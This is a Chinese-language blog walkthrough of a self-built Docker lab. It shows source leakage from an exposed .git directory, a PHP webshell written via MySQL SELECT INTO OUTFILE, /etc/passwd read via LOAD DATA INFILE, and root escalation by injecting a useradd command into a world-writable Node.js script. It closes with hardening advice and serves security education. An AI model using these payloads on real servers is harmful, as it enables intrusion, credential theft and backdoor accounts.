## 网站Git仓库暴露及不安全文件权限配置可能引发的的安全问题


### 目录

- 环境模拟
- git仓库
- webshell注入
- 提权
- 总结


本文源于对真实网站的测试整理而来。介绍通过从git仓库的暴露导致网站源码泄露以及不安全的文件权限配置可能会带来的安全问题。
文中的运行环境及代码为该网站的简单模拟。

测试环境
--
测试环境为经典的LNMP，即Linux、Nginx、MySQL、PHP架构的网站。Nginx运行了多个虚拟主机，其中PHP网站是一个图片浏览网站，提供简单的上传和浏览图片接口。网站使用git来管理代码版本且git目录可以通过http访问到。

![img](https://z3.ax1x.com/2021/10/14/5Qd9iV.png)

测试环境已打包成docker镜像，感兴趣的同学可以自己构建、运行。下面是启动测试环境的步骤。

项目地址：[https://github.com/raojinlin/lnmp-container.git](https://github.com/raojinlin/lnmp-container.git)

1. 将dockerfile下载下来

```$ git clone https://github.com/raojinlin/lnmp-container.git```

2. 构建镜像
```
$ cd lnmp-container
$ git submodule update   # 更新子模块
$ docker build -t lnmp . # 构建镜像

```

3. 运行镜像
```
$ docker run -p 8002:8002 -p 3306:3306 lnmp
```

接下来就可以访问网站了，http://127.0.0.1:8002/。

* 图片上传接口：```http://127.0.0.1:8002/```
![image](https://z3.ax1x.com/2021/10/16/5GDzOx.png)

* 图片浏览接口：```http://127.0.0.1:8002/list.php```


Git仓库
--

Git仓库有下面两种类型：
* 工作树中的.git目录
  * 本地的git仓库，工作树的修改，提交都会保存到此目录。 
* 裸(bare)仓库，通常作为远程仓库，用于与其他人交换数据，它没有自己的工作树，也就是说不在这个目录里修改、提交。
    * 通过push和fetch


Git仓库目录包含以下文件：
* branches
* config
* description
* HEAD
* hooks
* info
* objects
* refs


关于各个文件详细介绍请查看：[https://git-scm.com/docs/gitrepository-layout](https://git-scm.com/docs/gitrepository-layout)。这里只对```HEAD```、```objects```、```refs```做下简单的介绍。

* HEAD
    * 当前所在的分支或者一个特定的提交, ```ref: refs/heads/master```
* refs/，引用存储在此目录的子目录中
    * refs/heads/```name```
        * 记录分支名称的树尖提交对象
    * refs/tags/```name```
        * 记录任何对象名称（不一定是提交对象或指向提交对象的标记对象）。
    * refs/remotes/```name```
        * 记录从远程存储库复制的分支的树尖提交对象。
* objects/，与此仓库关联的对象存储。
    * objects/[0-9a-f][0-9a-f]，对象存储的子目录，目录名称为对象sha1值的前两位，最多有256(2^16)个。


Git对象文件
---

Git是一个内容可寻址的文件系统。Git的核心是一个简单的键值数据存储。我们可以在git插入任何类型的数据，然后git会返回一个可以在任意时间检索数据的key。```git hash-object```命令可以对数据计算出一个哈希值，这个值就是这个数据在git中的索引。```git cat-file```命令可以查看对象的内容，即通过对象的sha1检索。

对象的类型：
* Blob对象(Blob Objects)
    * Blob对象只存储了文件的内容，没有存储文件名。
* 树对象(Tree Objects)
    * 树对象存储了文件名，并且允许将一组文件存储到一起。Git存储内容与Unix文件系统类型，但是更简单。所有的内容都存储为ree和blob对象，tree对应到Unix的目录，blob对应于inode或者文件内容。
    * 树对象可以包含单个或者多个数对象，每个都包含一个执行blob或者子树的SHA-1指针及其关联的模式、类型和文件名。
* 提交对象(Commit Objects)
    * commit对象存储了快照保存者和保存时间以及保存原因的信息。 

下面做一个实践，在git创建和查看对象。

首先，初始化一个Git仓库：

```bash
✔ /tmp/test_git_objects  $ git init . # 初始化git
Initialized empty Git repository in /private/tmp/test_git_objects/.git/
```

使用```git hash-object```命令从标准输入读取内容计算sha1值并将内容写入Git对象。

```
✔ /tmp/test_git_objects [master L|✔]  $ echo xxxx | git hash-object -t blob -w --stdin
63fc8131d563e4c067404cb42d39eb293952bd51
```

然后我们就可以在```.git/objects```目录看到刚刚新增的对象。

```
✔ /tmp/test_git_objects [master L|✔]  $ find .git/objects
.git/objects
.git/objects/pack
.git/objects/info
.git/objects/63
.git/objects/63/fc8131d563e4c067404cb42d39eb293952bd51
✔ /tmp/test_git_objects [master L|✔]  $
✔ /tmp/test_git_objects [master L|✔]  $ file .git/objects/63/fc8131d563e4c067404cb42d39eb293952bd51
.git/objects/63/fc8131d563e4c067404cb42d39eb293952bd51: zlib compressed data
✔ /tmp/test_git_objects [master L|✔]  $

```

使用```git cat-file```命令查看对象内容。

```
✔ /tmp/test_git_objects [master L|✔]  $ git cat-file -p 63fc8131d563e4c067404cb42d39eb293952bd51
xxxx
✔ /tmp/test_git_objects [master L|✔]  $
```

关于Git对象的详细说明请前往查看：[https://git-scm.com/book/en/v2/Git-Internals-Git-Objects](https://git-scm.com/book/en/v2/Git-Internals-Git-Objects)


webshell注入
--

webshell的注入过程大概可以分为下面几个步骤：
1. 尝试上传webshell
2. 通过git查看服务端源码
3. 通过mysql注入webshell
    1. load data infile
    2. outfile



首先我们知道了这个网站是提供了图片上传接口的，那么能不能通过这个接口上传一个PHP文件上去呢？让我们来试试。

[![5JamqS.png](https://z3.ax1x.com/2021/10/16/5JamqS.png)](https://imgtu.com/i/5JamqS)

上传失败了，应该是对文件名后缀做了检查。那给文件再加个后缀呢？

[![5JaDR1.png](https://z3.ax1x.com/2021/10/16/5JaDR1.png)](https://imgtu.com/i/5JaDR1)

还是不行，估计对上传文件的媒体类型也做了检查。而且通过改文件名上传就算上传成功了也不一定能够被PHP解释器执行。一般来说nginx配置PHP-FPM反向代理都是匹配```.php```后缀的文件，也就是说后缀为```.php```的文件nginx才会交给PHP-FPM执行。

通过git查看服务端源码
---


首先，我们先看看git现在处于什么位置（当前分支）。


```
✔ /tmp/mytestgit [master L|…2]  $ curl 127.0.0.1:8002/.git/HEAD
ref: refs/heads/master
✔ /tmp/mytestgit [master L|…2]  $ curl 127.0.0.1:8002/.git/refs/heads/master
3d72900a4e25eca964cb9d540c6461735be2a514
```

这里提供一个小脚本fetchobject.sh下载Git对象并保存到本地仓库。

```bash

#!/bin/bash

prefix="${1:0:2}"
object=${1:2}
dir=".git/objects/${prefix}"

if [ ! -d "$dir" ]; then
    mkdir $dir;
fi

object_path=".git/objects/$prefix/$object"

curl 127.0.0.1:8002/$object_path -o $object_path

file $object_path;

if [ $? -eq 0 ]; then
  echo "";
  echo "Object $object_path fetched";
fi

```

在本地初始化一个git项目

![](https://i.bmp.ovh/imgs/2021/10/daa6aa253edb8511.png)


将最新的object下载下来，可以看到这是个commit对象。

![](https://i.bmp.ovh/imgs/2021/10/03f82fa1b5211778.png)


把当前commit对象所属的树对象下载下来，这里我们可以看到网站的目录结构了。

![](https://z3.ax1x.com/2021/10/16/5JNVJI.png)


有了目录结构，接下来就可以看到代码内容了。先看看config.php文件有什么。

[![5JNBTJ.png](https://z3.ax1x.com/2021/10/16/5JNBTJ.png)](https://imgtu.com/i/5JNBTJ)

这里我们看到config.php中包含了数据连接的配置和上传相关的配置，有地址、用户名、密码。试试能不能登录到数据库。

[![5JUSts.png](https://z3.ax1x.com/2021/10/16/5JUSts.png)](https://imgtu.com/i/5JUSts)

[![5JU3nO.png](https://z3.ax1x.com/2021/10/16/5JU3nO.png)](https://imgtu.com/i/5JU3nO)

登录到数据库成功！再看看其他的代码，看看upfile.php是什么逻辑。

[![5JdGYd.png](https://z3.ax1x.com/2021/10/16/5JdGYd.png)](https://imgtu.com/i/5JdGYd)

这段代码应该是处理图片上传的，而且它对上传的文件扩展名和媒体类型有做检查，接着往下看会发现有一段代码是判断保存上传文件的目录存不存在，如果不存在那么就创建一个目录而且它的文件权限是777。

[![5JwN4J.png](https://z3.ax1x.com/2021/10/16/5JwN4J.png)](https://imgtu.com/i/5JwN4J)


目前掌握的情况是：
1. 知道了数据的地址和用户名、密码并且可以登录到数据库。
2. 上传的文件会存放到uploads/目录中，uploads目录的文件权限是777。

如果可以通过MySQL向uploads/目录中写入一个文件，就完成了webshell的注入。

通过mysql注入webshell
---

在MySQL中有两个语句可以对文件进行读写操作：```LOAD DATA INFILE```和```SELECT ... INTO OUTFILE```。

* LOAD DATA INFILE
    * LOAD DATA语句可以高速的将文件文件的行读取到表中。
    * 可以从服务器读取也可以从客户端（```LOAD DATA LOCAL INFILE```）读取
* SELECT ... INTO OUTFILE
    * 允许将查询结果写入到文件。
    * 为了安全考虑不会写入到已存在的文件。

有了这两个语句就可以对服务器执行读写操作了。

MySQL读取磁盘的文件
----

比如读取```/etc/passswd```文件。

首先先创建一个表来存放文件的内容。
```sql
create table t1 (
    id int primary key auto_increment,
    content text
);
```

执行语句，读取/etc/passwd文件到表t1，字段按换行符分隔，插入到```content```字段。

```sql
LOAD DATA INFILE '/etc/passwd' into table t1 FIELDS TERMINATED BY '\n' (content);
```


读取成功。

[![5JB8kF.png](https://z3.ax1x.com/2021/10/16/5JB8kF.png)](https://imgtu.com/i/5JB8kF)

接下来要找到网站的document root在哪里，查看下nginx的配置文件```/etc/nginx/nginx.conf```。

[![5JDicR.png](https://z3.ax1x.com/2021/10/16/5JDicR.png)](https://imgtu.com/i/5JDicR)

```/etc/nginx/nginx.conf```没有发现PHP相关的配置，网站的nginx配置可能在```/etc/nginx/sites-enabled```目录下。

但是文件名是什么呢？先试试```/etc/nginx/sites-enabled/php```。

[![5JDcUU.png](https://z3.ax1x.com/2021/10/16/5JDcUU.png)](https://imgtu.com/i/5JDcUU)

找到了，网站的路径在```/var/www/phpupfile```。

MySQL写入文件到磁盘
----

试试能不能在网站根目录写入文件。

[![5JDHUO.png](https://z3.ax1x.com/2021/10/16/5JDHUO.png)](https://imgtu.com/i/5JDHUO)

写入失败了，MySQL是以mysql用户运行的，没有/var/www/phpupfile的写入权限。在```upfile.php```文件中发现```uploads```目录的权限是777，这个权限是可以写入的，再来一次。

[![5Jr0iD.png](https://z3.ax1x.com/2021/10/16/5Jr0iD.png)](https://imgtu.com/i/5Jr0iD)

写入成功了。

[![5Jr0iD.png](https://z3.ax1x.com/2021/10/16/5Jr0iD.png)](https://imgtu.com/i/5Jr0iD)

访问```curl http://127.0.0.1:8002```看看，好家伙，写入成功了。

[![5JrhFS.png](https://z3.ax1x.com/2021/10/16/5JrhFS.png)](https://imgtu.com/i/5JrhFS)

现在可以写webshell了，下面是将一段PHP代码写入到```/var/www/phpupfile/uploads/img.php```文件。这段代码会从url参数中读取命令(command)并执行它。

```sql
select '<?php system($_GET["command"] . " 2>&1");' into outfile  '/var/www/phpupfile/uploads/img.php';
```
[![5JsB7V.png](https://z3.ax1x.com/2021/10/16/5JsB7V.png)](https://imgtu.com/i/5JsB7V)

执行命令的效果。
[![5Jsfn1.png](https://z3.ax1x.com/2021/10/16/5Jsfn1.png)](https://imgtu.com/i/5Jsfn1)


到这里webshell就注入成功了，现在我们可以在服务器执行命令了。不过webshell的执行权限有限，它是以```www-data```用户运行的。


提权
---

怎么能够拿到更高的权限呢？通过上面执行的```ps auxf```命令可以看到服务器还运行了一个nodejs的脚本。如果可以在这个脚本里面一段代码那么就可以提权了，因为它是以root权限运行的。先看看```/var/www/nodejs/server.js```的权限。

[![5JytUK.png](https://z3.ax1x.com/2021/10/16/5JytUK.png)](https://imgtu.com/i/5JytUK)

权限竟然是777，那就好办了，只要往这个脚本追加一段代码，等它下次重启的时候就会被执行，而且是以root用户执行！

[![5JyOGF.png](https://z3.ax1x.com/2021/10/16/5JyOGF.png)](https://imgtu.com/i/5JyOGF)

添加一个新用户user1并将其添加到root组中。
```
useradd -M -N -G root user1
```

在nodejs中可以通过```child_process```模块执行命令：

```
try{
  require('child_process').execSync('useradd -M -N -G root user1')
} catch (e) {}
```

执行命令：

```
curl http://127.0.0.1:8002/uploads/img.php?command=echo%20%22try{%20require(%27child_process%27).execSync(%27useradd%20-M%20-N%20-G%20root%20user1%27)%20}%20catch%20(e)%20{}%22%20%3E%3E%20/var/www/nodejs/server.js
```

查看是否写入成功。

[![5Jg0v4.png](https://z3.ax1x.com/2021/10/16/5Jg0v4.png)](https://imgtu.com/i/5Jg0v4)

写入成功了，等脚本下次运行时就可以知道用户是否创建成功，创建成功的话就可以用该用户登录到服务器。

[![5JgXRS.png](https://z3.ax1x.com/2021/10/16/5JgXRS.png)](https://imgtu.com/i/5JgXRS)


总结
---

本文记录了从网站的git暴露开始，通过mysql注入webshell等如何一步一步拿到服务器的权限的步骤。在管理网站时要注意git目录的访问控制以及mysql的FILE权限，不要给文件或者目录设置过高的权限。

下面是几点安全防范建议：

1. 不要暴露.git仓库
2. 不要给过高的权限
3. 对于某些服务，不要以root用户运行进程
4. 建立多个mysql用户，且按场景分配权限，比如网站的用户就一般用不到```LOAD DATA```这种语句，如果要用的话可以新建一个专门用来操作文件的用户。
